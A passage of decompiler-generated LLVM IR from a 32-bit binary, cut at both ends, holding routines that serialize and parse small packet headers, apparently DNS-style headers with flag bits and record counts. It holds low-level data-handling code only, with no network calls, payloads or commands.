  %v2_14080 = load i32, i32* %arg1, align 4
  %v1_14084 = trunc i32 %v2_14080 to i8
  %v4_14084 = add i32 %arg2, 1
  %v5_14084 = inttoptr i32 %v4_14084 to i8*
  store i8 %v1_14084, i8* %v5_14084, align 1
  %v0_14088 = load i32, i32* %lr.global-to-local, align 4
  %v1_14088 = add i32 %v0_14088, 12
  %v2_14088 = inttoptr i32 %v1_14088 to i32*
  %v3_14088 = load i32, i32* %v2_14088, align 4
  %v1_1408c = add i32 %v0_14088, 4
  %v2_1408c = inttoptr i32 %v1_1408c to i32*
  %v3_1408c = load i32, i32* %v2_1408c, align 4
  %v1_14090 = add i32 %v0_14088, 16
  %v2_14090 = inttoptr i32 %v1_14090 to i32*
  %v3_14090 = load i32, i32* %v2_14090, align 4
  %v1_14094 = add i32 %tmp, 8
  %v2_14094 = inttoptr i32 %v1_14094 to i32*
  %v3_14094 = load i32, i32* %v2_14094, align 4
  %v2_14098 = icmp eq i32 %v3_14088, 0
  %. = select i1 %v2_14098, i32 0, i32 4
  %v2_140a4 = icmp eq i32 %v3_1408c, 0
  %v1_140a8 = add i32 %v0_14088, 20
  %v2_140a8 = inttoptr i32 %v1_140a8 to i32*
  %v3_140a8 = load i32, i32* %v2_140a8, align 4
  %storemerge12 = select i1 %v2_140a4, i32 0, i32 128
  %v1_140b4 = urem i32 %v3_14094, 16
  %v2_140b8 = icmp eq i32 %v3_14090, 0
  %.29 = select i1 %v2_140b8, i32 0, i32 2
  %v4_140c4 = mul nuw nsw i32 %v1_140b4, 8
  %v5_140c4 = or i32 %v4_140c4, %.
  %v2_140c8 = icmp eq i32 %v3_140a8, 0
  br i1 %v2_140c8, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_14078
  %v2_140cc = or i32 %v5_140c4, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_14078, %bb25
  %v1_140d4 = phi i32 [ %v5_140c4, %dec_label_pc_14078 ], [ %v2_140cc, %bb25 ]
  %v2_140d0 = or i32 %.29, %storemerge12
  %v2_140d4 = or i32 %v2_140d0, %v1_140d4
  %v1_140d8 = trunc i32 %v2_140d4 to i8
  %v2_140d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_140d8 = add i32 %v2_140d8, 2
  %v4_140d8 = inttoptr i32 %v3_140d8 to i8*
  store i8 %v1_140d8, i8* %v4_140d8, align 1
  %v0_140dc = load i32, i32* %lr.global-to-local, align 4
  %v1_140dc = add i32 %v0_140dc, 24
  %v1_140e0 = inttoptr i32 %v1_140dc to i32*
  %v2_140e0 = load i32, i32* %v1_140e0, align 4
  %v3_140e0 = add i32 %v0_140dc, 28
  %v4_140e0 = inttoptr i32 %v3_140e0 to i32*
  %v5_140e0 = load i32, i32* %v4_140e0, align 4
  %v2_140e4 = icmp eq i32 %v2_140e0, 0
  %v1_140e8 = urem i32 %v5_140e0, 16
  %.30 = select i1 %v2_140e4, i32 0, i32 128
  %v2_140f4 = or i32 %v1_140e8, %.30
  %v1_140f8 = trunc i32 %v2_140f4 to i8
  %v2_140f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_140f8 = add i32 %v2_140f8, 3
  %v4_140f8 = inttoptr i32 %v3_140f8 to i8*
  store i8 %v1_140f8, i8* %v4_140f8, align 1
  %v0_140fc = load i32, i32* %lr.global-to-local, align 4
  %v1_140fc = add i32 %v0_140fc, 33
  %v2_140fc = inttoptr i32 %v1_140fc to i8*
  %v3_140fc = load i8, i8* %v2_140fc, align 1
  %v2_14100 = load i32, i32* %r4.global-to-local, align 4
  %v3_14100 = add i32 %v2_14100, 4
  %v4_14100 = inttoptr i32 %v3_14100 to i8*
  store i8 %v3_140fc, i8* %v4_14100, align 1
  %v0_14104 = load i32, i32* %lr.global-to-local, align 4
  %v1_14104 = add i32 %v0_14104, 32
  %v2_14104 = inttoptr i32 %v1_14104 to i32*
  %v3_14104 = load i32, i32* %v2_14104, align 4
  %v1_14108 = trunc i32 %v3_14104 to i8
  %v2_14108 = load i32, i32* %r4.global-to-local, align 4
  %v3_14108 = add i32 %v2_14108, 5
  %v4_14108 = inttoptr i32 %v3_14108 to i8*
  store i8 %v1_14108, i8* %v4_14108, align 1
  %v0_1410c = load i32, i32* %lr.global-to-local, align 4
  %v1_1410c = add i32 %v0_1410c, 37
  %v2_1410c = inttoptr i32 %v1_1410c to i8*
  %v3_1410c = load i8, i8* %v2_1410c, align 1
  %v2_14110 = load i32, i32* %r4.global-to-local, align 4
  %v3_14110 = add i32 %v2_14110, 6
  %v4_14110 = inttoptr i32 %v3_14110 to i8*
  store i8 %v3_1410c, i8* %v4_14110, align 1
  %v0_14114 = load i32, i32* %lr.global-to-local, align 4
  %v1_14114 = add i32 %v0_14114, 36
  %v2_14114 = inttoptr i32 %v1_14114 to i32*
  %v3_14114 = load i32, i32* %v2_14114, align 4
  %v1_14118 = trunc i32 %v3_14114 to i8
  %v2_14118 = load i32, i32* %r4.global-to-local, align 4
  %v3_14118 = add i32 %v2_14118, 7
  %v4_14118 = inttoptr i32 %v3_14118 to i8*
  store i8 %v1_14118, i8* %v4_14118, align 1
  %v0_1411c = load i32, i32* %lr.global-to-local, align 4
  %v1_1411c = add i32 %v0_1411c, 41
  %v2_1411c = inttoptr i32 %v1_1411c to i8*
  %v3_1411c = load i8, i8* %v2_1411c, align 1
  %v2_14120 = load i32, i32* %r4.global-to-local, align 4
  %v3_14120 = add i32 %v2_14120, 8
  %v4_14120 = inttoptr i32 %v3_14120 to i8*
  store i8 %v3_1411c, i8* %v4_14120, align 1
  %v0_14124 = load i32, i32* %lr.global-to-local, align 4
  %v1_14124 = add i32 %v0_14124, 40
  %v2_14124 = inttoptr i32 %v1_14124 to i32*
  %v3_14124 = load i32, i32* %v2_14124, align 4
  %v1_14128 = trunc i32 %v3_14124 to i8
  %v2_14128 = load i32, i32* %r4.global-to-local, align 4
  %v3_14128 = add i32 %v2_14128, 9
  %v4_14128 = inttoptr i32 %v3_14128 to i8*
  store i8 %v1_14128, i8* %v4_14128, align 1
  %v0_1412c = load i32, i32* %lr.global-to-local, align 4
  %v1_1412c = add i32 %v0_1412c, 45
  %v2_1412c = inttoptr i32 %v1_1412c to i8*
  %v3_1412c = load i8, i8* %v2_1412c, align 1
  %v2_14130 = load i32, i32* %r4.global-to-local, align 4
  %v3_14130 = add i32 %v2_14130, 10
  %v4_14130 = inttoptr i32 %v3_14130 to i8*
  store i8 %v3_1412c, i8* %v4_14130, align 1
  %v0_14134 = load i32, i32* %lr.global-to-local, align 4
  %v1_14134 = add i32 %v0_14134, 44
  %v2_14134 = inttoptr i32 %v1_14134 to i32*
  %v3_14134 = load i32, i32* %v2_14134, align 4
  %v1_14138 = trunc i32 %v3_14134 to i8
  %v2_14138 = load i32, i32* %r4.global-to-local, align 4
  %v3_14138 = add i32 %v2_14138, 11
  %v4_14138 = inttoptr i32 %v3_14138 to i8*
  store i8 %v1_14138, i8* %v4_14138, align 1
  %v2_14144.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14140

dec_label_pc_14140:                               ; preds = %dec_label_pc_14060, %bb26
  %v2_14144 = phi i32 [ %v3_14064, %dec_label_pc_14060 ], [ %v2_14144.pre, %bb26 ]
  %v0_14140 = phi i32 [ -1, %dec_label_pc_14060 ], [ 12, %bb26 ]
  store i32 %v2_14144, i32* @r4, align 4
  ret i32 %v0_14140

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14140, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @function_14148(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14148:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_14148 = load i8, i8* %arg1, align 1
  %v4_14148 = zext i8 %v3_14148 to i32
  %v2_1414c = add i32 %tmp, 1
  %v3_1414c = inttoptr i32 %v2_1414c to i8*
  %v4_1414c = load i8, i8* %v3_1414c, align 1
  %v5_1414c = zext i8 %v4_1414c to i32
  %v4_14150 = mul nuw nsw i32 %v4_14148, 256
  %v5_14150 = or i32 %v5_1414c, %v4_14150
  %v2_14154 = inttoptr i32 %arg2 to i32*
  store i32 %v5_14150, i32* %v2_14154, align 4
  %v2_14158 = add i32 %tmp, 2
  %v3_14158 = inttoptr i32 %v2_14158 to i8*
  %v4_14158 = load i8, i8* %v3_14158, align 1
  %tmp4 = icmp slt i8 %v4_14158, 0
  %v3_1415c = zext i1 %tmp4 to i32
  %v2_14160 = add i32 %arg2, 4
  %v3_14160 = inttoptr i32 %v2_14160 to i32*
  store i32 %v3_1415c, i32* %v3_14160, align 4
  %v4_14164 = load i8, i8* %v3_14158, align 1
  %div = udiv i8 %v4_14164, 8
  %tmp5 = urem i8 %div, 16
  %v1_1416c = zext i8 %tmp5 to i32
  %v2_14170 = add i32 %arg2, 8
  %v3_14170 = inttoptr i32 %v2_14170 to i32*
  store i32 %v1_1416c, i32* %v3_14170, align 4
  %v4_14174 = load i8, i8* %v3_14158, align 1
  %div1 = udiv i8 %v4_14174, 4
  %tmp6 = urem i8 %div1, 2
  %v1_1417c = zext i8 %tmp6 to i32
  %v2_14180 = add i32 %arg2, 12
  %v3_14180 = inttoptr i32 %v2_14180 to i32*
  store i32 %v1_1417c, i32* %v3_14180, align 4
  %v4_14184 = load i8, i8* %v3_14158, align 1
  %div2 = udiv i8 %v4_14184, 2
  %tmp7 = urem i8 %div2, 2
  %v1_1418c = zext i8 %tmp7 to i32
  %v2_14190 = add i32 %arg2, 16
  %v3_14190 = inttoptr i32 %v2_14190 to i32*
  store i32 %v1_1418c, i32* %v3_14190, align 4
  %v4_14194 = load i8, i8* %v3_14158, align 1
  %tmp8 = urem i8 %v4_14194, 2
  %v1_14198 = zext i8 %tmp8 to i32
  %v2_1419c = add i32 %arg2, 20
  %v3_1419c = inttoptr i32 %v2_1419c to i32*
  store i32 %v1_14198, i32* %v3_1419c, align 4
  %v2_141a0 = add i32 %tmp, 3
  %v3_141a0 = inttoptr i32 %v2_141a0 to i8*
  %v4_141a0 = load i8, i8* %v3_141a0, align 1
  %tmp9 = icmp slt i8 %v4_141a0, 0
  %v3_141a4 = zext i1 %tmp9 to i32
  %v2_141a8 = add i32 %arg2, 24
  %v3_141a8 = inttoptr i32 %v2_141a8 to i32*
  store i32 %v3_141a4, i32* %v3_141a8, align 4
  %v4_141ac = load i8, i8* %v3_141a0, align 1
  %tmp10 = urem i8 %v4_141ac, 16
  %v1_141b0 = zext i8 %tmp10 to i32
  %v2_141b4 = add i32 %arg2, 28
  %v3_141b4 = inttoptr i32 %v2_141b4 to i32*
  store i32 %v1_141b0, i32* %v3_141b4, align 4
  %v2_141b8 = add i32 %tmp, 4
  %v3_141b8 = inttoptr i32 %v2_141b8 to i8*
  %v4_141b8 = load i8, i8* %v3_141b8, align 1
  %v5_141b8 = zext i8 %v4_141b8 to i32
  %v2_141bc = add i32 %tmp, 5
  %v3_141bc = inttoptr i32 %v2_141bc to i8*
  %v4_141bc = load i8, i8* %v3_141bc, align 1
  %v5_141bc = zext i8 %v4_141bc to i32
  %v4_141c0 = mul nuw nsw i32 %v5_141b8, 256
  %v5_141c0 = or i32 %v5_141bc, %v4_141c0
  %v2_141c4 = add i32 %arg2, 32
  %v3_141c4 = inttoptr i32 %v2_141c4 to i32*
  store i32 %v5_141c0, i32* %v3_141c4, align 4
  %v2_141c8 = add i32 %tmp, 6
  %v3_141c8 = inttoptr i32 %v2_141c8 to i8*
  %v4_141c8 = load i8, i8* %v3_141c8, align 1
  %v5_141c8 = zext i8 %v4_141c8 to i32
  %v2_141cc = add i32 %tmp, 7
  %v3_141cc = inttoptr i32 %v2_141cc to i8*
  %v4_141cc = load i8, i8* %v3_141cc, align 1
  %v5_141cc = zext i8 %v4_141cc to i32
  %v4_141d0 = mul nuw nsw i32 %v5_141c8, 256
  %v5_141d0 = or i32 %v5_141cc, %v4_141d0
  %v2_141d4 = add i32 %arg2, 36
  %v3_141d4 = inttoptr i32 %v2_141d4 to i32*
  store i32 %v5_141d0, i32* %v3_141d4, align 4
  %v2_141d8 = add i32 %tmp, 8
  %v3_141d8 = inttoptr i32 %v2_141d8 to i8*
  %v4_141d8 = load i8, i8* %v3_141d8, align 1
  %v5_141d8 = zext i8 %v4_141d8 to i32
  %v2_141dc = add i32 %tmp, 9
  %v3_141dc = inttoptr i32 %v2_141dc to i8*
  %v4_141dc = load i8, i8* %v3_141dc, align 1
  %v5_141dc = zext i8 %v4_141dc to i32
  %v4_141e0 = mul nuw nsw i32 %v5_141d8, 256
  %v5_141e0 = or i32 %v5_141dc, %v4_141e0
  %v2_141e4 = add i32 %arg2, 40
  %v3_141e4 = inttoptr i32 %v2_141e4 to i32*
  store i32 %v5_141e0, i32* %v3_141e4, align 4
  %v2_141e8 = add i32 %tmp, 11
  %v3_141e8 = inttoptr i32 %v2_141e8 to i8*
  %v4_141e8 = load i8, i8* %v3_141e8, align 1
  %v5_141e8 = zext i8 %v4_141e8 to i32
  %v2_141ec = add i32 %tmp, 10
  %v3_141ec = inttoptr i32 %v2_141ec to i8*
  %v4_141ec = load i8, i8* %v3_141ec, align 1
  %v5_141ec = zext i8 %v4_141ec to i32
  %v4_141f4 = mul nuw nsw i32 %v5_141ec, 256
  %v5_141f4 = or i32 %v4_141f4, %v5_141e8
  %v2_141f8 = add i32 %arg2, 44
  %v3_141f8 = inttoptr i32 %v2_141f8 to i32*
  store i32 %v5_141f4, i32* %v3_141f8, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 8, 9, 3, 4, 5, 6, 10, 1, 2, 11, 12, 13, 14, 15, 0, 7 }
  uselistorder i32 40, { 5, 6, 8, 7, 1, 14, 2, 0, 9, 10, 11, 12, 13, 4, 3 }
  uselistorder i32 28, { 9, 4, 5, 6, 26, 17, 30, 10, 12, 7, 11, 1, 18, 2, 13, 27, 28, 14, 15, 19, 20, 21, 22, 23, 24, 0, 25, 8, 29, 3, 16 }
  uselistorder i8 2, { 0, 1, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @function_14200(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_14200:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14200 = load i32, i32* @r4, align 4
  store i32 %v3_14200, i32* %stack_var_-16, align 4
  %v6_14200 = load i32, i32* @r5, align 4
  %v9_14200 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_14208 = load i32, i32* %arg1, align 4
  store i32 %v2_14208, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_14214 = inttoptr i32 %v2_14208 to i8*
  %v2_14214 = call i32 @function_14874(i8* %v1_14214)
  store i32 %v2_14214, i32* %r0.global-to-local, align 4
  %v1_14218 = icmp slt i32 %v2_14214, 0
  br i1 %v1_14218, label %bb, label %bb6

bb:                                               ; preds = %dec_label_pc_14200
  %v5_14220 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_14220, i32* @r4, align 4
  store i32 %v6_14200, i32* @r5, align 4
  store i32 %v9_14200, i32* @r6, align 4
  ret i32 %v2_14214

bb6:                                              ; preds = %dec_label_pc_14200
  %v1_1421c = load i32, i32* @r4, align 4
  %v2_1421c = sub i32 %v1_1421c, %v2_14214
  %v0_14228 = load i32, i32* @r6, align 4
  %v2_14228 = add i32 %v0_14228, %v2_14214
  store i32 %v2_14228, i32* %r2.global-to-local, align 4
  %v7_1422c = icmp sgt i32 %v2_1421c, 3
  br i1 %v7_1422c, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_14230 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_14230, i32* @r4, align 4
  store i32 %v6_14200, i32* @r5, align 4
  store i32 %v9_14200, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_14234 = load i32, i32* @r5, align 4
  %v1_14234 = add i32 %v0_14234, 5
  %v2_14234 = inttoptr i32 %v1_14234 to i8*
  %v3_14234 = load i8, i8* %v2_14234, align 1
  %v5_14238 = inttoptr i32 %v2_14228 to i8*
  store i8 %v3_14234, i8* %v5_14238, align 1
  %v0_1423c = load i32, i32* @r5, align 4
  %v1_1423c = add i32 %v0_1423c, 4
  %v2_1423c = inttoptr i32 %v1_1423c to i32*
  %v3_1423c = load i32, i32* %v2_1423c, align 4
  %v1_14240 = trunc i32 %v3_1423c to i8
  %v2_14240 = load i32, i32* %r2.global-to-local, align 4
  %v3_14240 = add i32 %v2_14240, 1
  %v4_14240 = inttoptr i32 %v3_14240 to i8*
  store i8 %v1_14240, i8* %v4_14240, align 1
  %v0_14244 = load i32, i32* @r5, align 4
  %v1_14244 = add i32 %v0_14244, 9
  %v2_14244 = inttoptr i32 %v1_14244 to i8*
  %v3_14244 = load i8, i8* %v2_14244, align 1
  %v2_14248 = load i32, i32* %r2.global-to-local, align 4
  %v3_14248 = add i32 %v2_14248, 2
  %v4_14248 = inttoptr i32 %v3_14248 to i8*
  store i8 %v3_14244, i8* %v4_14248, align 1
  %v0_1424c = load i32, i32* @r5, align 4
  %v1_1424c = add i32 %v0_1424c, 8
  %v2_1424c = inttoptr i32 %v1_1424c to i32*
  %v3_1424c = load i32, i32* %v2_1424c, align 4
  %v0_14250 = load i32, i32* %r0.global-to-local, align 4
  %v1_14250 = add i32 %v0_14250, 4
  store i32 %v1_14250, i32* %r0.global-to-local, align 4
  %v1_14254 = trunc i32 %v3_1424c to i8
  %v2_14254 = load i32, i32* %r2.global-to-local, align 4
  %v3_14254 = add i32 %v2_14254, 3
  %v4_14254 = inttoptr i32 %v3_14254 to i8*
  store i8 %v1_14254, i8* %v4_14254, align 1
  %v2_14258 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14258, i32* @r4, align 4
  store i32 %v6_14200, i32* @r5, align 4
  store i32 %v9_14200, i32* @r6, align 4
  ret i32 %v1_14250

; uselistorder directives
  uselistorder i32 %v2_14214, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_14200, { 1, 0, 2 }
  uselistorder i32 %v6_14200, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @function_1425c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1425c:
  %v0_14260 = call i32 @function_149e8()
  %v1_14264 = icmp slt i32 %v0_14260, 0
  br i1 %v1_14264, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1425c
  %v4_14268 = add i32 %v0_14260, 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1425c, %bb
  %v5_1426c = phi i32 [ %v0_14260, %dec_label_pc_1425c ], [ %v4_14268, %bb ]
  ret i32 %v5_1426c

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_14270(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
dec_label_pc_14270:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_14270 = load i32, i32* @r4, align 4
  %v6_14270 = load i32, i32* @r5, align 4
  %v9_14270 = load i32, i32* @r6, align 4
  %v12_14270 = load i32, i32* @r7, align 4
  %v21_14270 = load i32, i32* @sl, align 4
  %v2_14274 = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_14274, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_14290 = call i32 @function_1491c()
  store i32 %v0_14290, i32* %r0.global-to-local, align 4
  store i32 %v0_14290, i32* @r7, align 4
  %v1_14294 = icmp slt i32 %v0_14290, 0
  %v0_14298 = load i32, i32* @r4, align 4
  %v2_14298 = add i32 %v0_14298, %v0_14290
  store i32 %v2_14298, i32* %r8.global-to-local, align 4
  br i1 %v1_14294, label %bb14, label %dec_label_pc_142a8

dec_label_pc_142a8:                               ; preds = %dec_label_pc_14270
  %v1_142a0 = load i32, i32* @r5, align 4
  %v2_142a0 = sub i32 %v1_142a0, %v2_14298
  %v1_142a8 = add i32 %v2_142a0, -10
  store i32 %v1_142a8, i32* @r5, align 4
  %v6_142a8 = icmp slt i32 %v1_142a8, 0
  store i32 %v2_14274, i32* %r0.global-to-local, align 4
  %v0_142b0 = load i32, i32* @sl, align 4
  %v2_142b0 = add i32 %v0_142b0, %v2_14298
  store i32 %v2_142b0, i32* @r4, align 4
  br i1 %v6_142a8, label %bb, label %dec_label_pc_142bc

bb:                                               ; preds = %dec_label_pc_142a8
  br label %bb14

dec_label_pc_142bc:                               ; preds = %dec_label_pc_142a8
  %v1_142bc = call i32 @function_f170(i32 %v2_14274)
  store i32 %v1_142bc, i32* %r0.global-to-local, align 4
  %v1_142c0 = load i32, i32* @r6, align 4
  %v2_142c0 = inttoptr i32 %v1_142c0 to i32*
  store i32 %v1_142bc, i32* %v2_142c0, align 4
  %v0_142c4 = load i32, i32* @sl, align 4
  %v1_142c4 = load i32, i32* %r8.global-to-local, align 4
  %v2_142c4 = add i32 %v1_142c4, %v0_142c4
  %v3_142c4 = inttoptr i32 %v2_142c4 to i8*
  %v4_142c4 = load i8, i8* %v3_142c4, align 1
  %v6_142c4 = zext i8 %v4_142c4 to i32
  %v0_142c8 = load i32, i32* @r4, align 4
  %v1_142c8 = add i32 %v0_142c8, 1
  %v2_142c8 = inttoptr i32 %v1_142c8 to i8*
  %v3_142c8 = load i8, i8* %v2_142c8, align 1
  %v4_142c8 = zext i8 %v3_142c8 to i32
  %v4_142cc = mul nuw nsw i32 %v6_142c4, 256
  %v5_142cc = or i32 %v4_142c8, %v4_142cc
  store i32 %v5_142cc, i32* %r3.global-to-local, align 4
  %v1_142d0 = load i32, i32* @r6, align 4
  %v2_142d0 = add i32 %v1_142d0, 4
  %v3_142d0 = inttoptr i32 %v2_142d0 to i32*
  store i32 %v5_142cc, i32* %v3_142d0, align 4
  %v0_142d4 = load i32, i32* @r4, align 4
  %v1_142d4 = add i32 %v0_142d4, 2
  store i32 %v1_142d4, i32* %r1.global-to-local, align 4
  %v2_142d8 = inttoptr i32 %v1_142d4 to i8*
  %v3_142d8 = load i8, i8* %v2_142d8, align 1
  %v4_142d8 = zext i8 %v3_142d8 to i32
  %v1_142dc = add i32 %v0_142d4, 3
  %v2_142dc = inttoptr i32 %v1_142dc to i8*
  %v3_142dc = load i8, i8* %v2_142dc, align 1
  %v4_142dc = zext i8 %v3_142dc to i32
  %v4_142e0 = mul nuw nsw i32 %v4_142d8, 256
  %v5_142e0 = or i32 %v4_142dc, %v4_142e0
  store i32 %v5_142e0, i32* %r3.global-to-local, align 4
  %v1_142e4 = load i32, i32* @r6, align 4
  %v2_142e4 = add i32 %v1_142e4, 8
  %v3_142e4 = inttoptr i32 %v2_142e4 to i32*
  store i32 %v5_142e0, i32* %v3_142e4, align 4
  %v0_142e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_142e8 = add i32 %v0_142e8, 2
  %v1_142ec = add i32 %v0_142e8, 3
  %v2_142ec = inttoptr i32 %v1_142ec to i8*
  %v3_142ec = load i8, i8* %v2_142ec, align 1
  %v4_142ec = zext i8 %v3_142ec to i32
  store i32 %v4_142ec, i32* %r3.global-to-local, align 4
  %v2_142f0 = inttoptr i32 %v1_142e8 to i8*
  %v3_142f0 = load i8, i8* %v2_142f0, align 1
  %v4_142f0 = zext i8 %v3_142f0 to i32
  store i32 %v4_142f0, i32* %r0.global-to-local, align 4
  %v1_142f4 = add i32 %v0_142e8, 5
  %v2_142f4 = inttoptr i32 %v1_142f4 to i8*
  %v3_142f4 = load i8, i8* %v2_142f4, align 1
  %v4_142f4 = zext i8 %v3_142f4 to i32
  %v3_142f8 = mul nuw nsw i32 %v4_142ec, 65536
  store i32 %v3_142f8, i32* %r3.global-to-local, align 4
  %v1_142fc = add i32 %v0_142e8, 4
  %v2_142fc = inttoptr i32 %v1_142fc to i8*
  %v3_142fc = load i8, i8* %v2_142fc, align 1
  %v4_142fc = zext i8 %v3_142fc to i32
  %v4_14300 = mul nuw i32 %v4_142f0, 16777216
  %v5_14300 = or i32 %v4_14300, %v3_142f8
  %v2_14304 = or i32 %v5_14300, %v4_142f4
  %v4_14308 = mul nuw nsw i32 %v4_142fc, 256
  %v5_14308 = or i32 %v2_14304, %v4_14308
  store i32 %v5_14308, i32* %r3.global-to-local, align 4
  %v1_1430c = load i32, i32* @r6, align 4
  %v2_1430c = add i32 %v1_1430c, 12
  %v3_1430c = inttoptr i32 %v2_1430c to i32*
  store i32 %v5_14308, i32* %v3_1430c, align 4
  %v0_14310 = load i32, i32* %r1.global-to-local, align 4
  %v1_14310 = add i32 %v0_14310, 6
  %v2_14310 = inttoptr i32 %v1_14310 to i8*
  %v3_14310 = load i8, i8* %v2_14310, align 1
  %v4_14310 = zext i8 %v3_14310 to i32
  %v0_14314 = load i32, i32* @r4, align 4
  %v1_14314 = add i32 %v0_14314, 9
  %v2_14314 = inttoptr i32 %v1_14314 to i8*
  %v3_14314 = load i8, i8* %v2_14314, align 1
  %v4_14314 = zext i8 %v3_14314 to i32
  %v1_14318 = add i32 %v0_14314, 10
  store i32 %v1_14318, i32* %r0.global-to-local, align 4
  %v4_1431c = mul nuw nsw i32 %v4_14310, 256
  %v5_1431c = or i32 %v4_14314, %v4_1431c
  store i32 %v5_1431c, i32* %r3.global-to-local, align 4
  %v0_14320 = load i32, i32* %r8.global-to-local, align 4
  %v1_14320 = add i32 %v0_14320, 10
  %v0_14324 = load i32, i32* @r5, align 4
  %v1_14328 = add nuw nsw i32 %v5_1431c, 10
  store i32 %v1_14328, i32* %r1.global-to-local, align 4
  %v1_1432c = load i32, i32* @r6, align 4
  %v2_1432c = add i32 %v1_1432c, 24
  %v3_1432c = inttoptr i32 %v2_1432c to i32*
  store i32 %v1_14320, i32* %v3_1432c, align 4
  %v0_14330 = load i32, i32* %r0.global-to-local, align 4
  %v1_14330 = load i32, i32* @r6, align 4
  %v2_14330 = add i32 %v1_14330, 20
  %v3_14330 = inttoptr i32 %v2_14330 to i32*
  store i32 %v0_14330, i32* %v3_14330, align 4
  %v0_14334 = load i32, i32* %r3.global-to-local, align 4
  %v1_14334 = load i32, i32* @r6, align 4
  %v2_14334 = add i32 %v1_14334, 16
  %v3_14334 = inttoptr i32 %v2_14334 to i32*
  store i32 %v0_14334, i32* %v3_14334, align 4
  %v0_14338 = load i32, i32* @r7, align 4
  %v1_14338 = load i32, i32* %r1.global-to-local, align 4
  %v2_14338 = add i32 %v1_14338, %v0_14338
  %v5_1433c = icmp slt i32 %v0_14324, %v5_1431c
  %.v2_14338 = select i1 %v5_1433c, i32 -1, i32 %v2_14338
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_142bc, %dec_label_pc_14270
  %v0_14340 = phi i32 [ %.v2_14338, %dec_label_pc_142bc ], [ %v1_142a8, %bb ], [ %v0_14290, %dec_label_pc_14270 ]
  store i32 %v0_14340, i32* %r0.global-to-local, align 4
  store i32 %v3_14270, i32* @r4, align 4
  store i32 %v6_14270, i32* @r5, align 4
  store i32 %v9_14270, i32* @r6, align 4
  store i32 %v12_14270, i32* @r7, align 4
  store i32 %v21_14270, i32* @sl, align 4
  ret i32 %v0_14340

; uselistorder directives
  uselistorder i32 %v0_14340, { 1, 0 }
  uselistorder i32 %v5_1431c, { 1, 0, 2 }
  uselistorder i32 %v3_142f8, { 1, 0 }
  uselistorder i32 %v1_142a8, { 0, 2, 1 }
  uselistorder i32 %v0_14290, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 24, { 4, 5, 6, 8, 7, 0, 16, 17, 18, 9, 2, 22, 1, 19, 10, 11, 12, 13, 14, 15, 3, 20, 21 }
  uselistorder i32 9, { 7, 8, 9, 10, 11, 1, 20, 2, 12, 0, 13, 14, 3, 15, 5, 16, 17, 18, 19, 4, 6 }
  uselistorder i32 5, { 1, 13, 14, 15, 8, 4, 2, 9, 3, 0, 16, 17, 5, 10, 11, 12, 6, 7 }
  uselistorder i32 (i32)* @function_f170, { 2, 1, 0, 3 }
  uselistorder i32 -10, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @function_1434c() local_unnamed_addr {
dec_label_pc_1434c:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_17c28.576 to i32), i32* @r1, align 4
  %v0_14350 = load i32, i32* @lr, align 4
  store i32 %v0_14350, i32* %stack_var_-4, align 4
